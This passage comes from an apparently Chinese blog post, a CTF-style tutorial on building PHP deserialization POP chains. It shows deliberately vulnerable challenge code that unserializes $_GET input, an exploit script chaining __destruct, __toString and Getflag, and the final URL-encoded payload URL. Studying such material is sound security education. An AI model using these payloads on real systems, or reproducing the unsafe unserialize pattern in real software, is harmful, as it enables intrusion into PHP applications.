-<h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h4><p> 前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
-<p><strong>实列及讲解</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(&quot;index.php&quot;);</span><br><span class="line"></span><br><span class="line">class w44m&#123;</span><br><span class="line"></span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line"></span><br><span class="line">    public function Getflag()&#123;</span><br><span class="line">        if($this-&gt;admin === &#x27;w44m&#x27; &amp;&amp; $this-&gt;passwd ===&#x27;08067&#x27;)&#123;</span><br><span class="line">            include(&#x27;flag.php&#x27;);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo $this-&gt;admin;</span><br><span class="line">            echo $this-&gt;passwd;</span><br><span class="line">            echo &#x27;nono&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[&#x27;w00m&#x27;];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>首先观察一下整段代码，<code>w44m</code>类里面的<code>Getflag</code>函数可以用来读取flag，因此就将它作为这条链子的尾部。</p>
-<p>再想一下如何去调用这个函数，<code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</code>会调用函数，所以只需要给<code>$w00m</code>赋一个<code>w44m</code>类，然后再给<code>w22m</code>赋一个<code>Getflag</code>就能成功调用该函数。</p>
-<p>还差谁？<code>w33m</code>。再考虑一下如何调用这个<code>w33m</code>类呢？<code>__toString()</code>方法会在一个对象被当作字符串时被调用，于是我们就能看到下面<code>w22m</code>这个类里面的<code>echo</code>函数。我们只要给<code>w00m</code>赋一个<code>w33m</code>类，就能调用。</p>
-<p>构造exp：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class w44m&#123;</span><br><span class="line">    private $admin=&#x27;w44m&#x27;;</span><br><span class="line">    protected $passwd=&#x27;08067&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w22m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m&#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new w22m;</span><br><span class="line">$a-&gt;w00m=new w33m;</span><br><span class="line">$a-&gt;w00m-&gt;w00m=new w44m;</span><br><span class="line">$a-&gt;w00m-&gt;w22m=&#x27;Getflag&#x27;;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>输出为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
-<p>最终WP：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?w00m=O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-        <tag>unserialization</tag>
       </tags>
   </entry>
   <entry>
